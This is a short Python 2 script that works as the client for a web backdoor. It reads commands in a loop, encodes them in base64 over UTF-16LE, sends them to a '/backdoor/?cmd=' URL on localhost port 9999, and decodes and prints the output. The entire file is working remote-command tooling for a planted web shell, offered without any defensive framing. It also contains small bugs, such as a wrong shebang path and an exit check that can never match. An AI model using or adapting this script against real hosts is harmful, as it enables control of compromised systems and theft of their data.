#!/usr/env/python
import requests
from base64 import b64encode, b64decode
import urllib

def main():
	url = "http://127.0.0.1:9999/backdoor/?cmd="
	while True:
		cmd = raw_input('CMD: ').strip()
		if cmd.upper() == 'exit':
			requests.get(url + 'exit')
			return
		else:
			print(b64decode(requests.get(url + urllib.quote( b64encode(cmd.encode('UTF-16LE')), safe='' ) ).text).replace('\x00',''))

if __name__ == "__main__":
	main()
